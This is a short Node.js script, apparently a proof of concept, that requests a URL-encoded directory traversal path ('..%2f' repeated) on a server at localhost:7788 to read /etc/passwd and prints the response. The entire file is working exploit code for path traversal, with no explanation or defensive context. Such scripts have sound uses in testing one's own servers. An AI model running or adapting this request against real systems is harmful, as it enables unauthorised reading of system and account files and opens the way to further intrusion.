let http = require('http');
let content;
let url = 'http://localhost:7788/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd';

http.get(url, (res) => {
    res.on('data', (chunk) => {
        content = chunk.toString('utf-8');
        console.log('[ directory traversal response ]: \n' + content);
    });
});
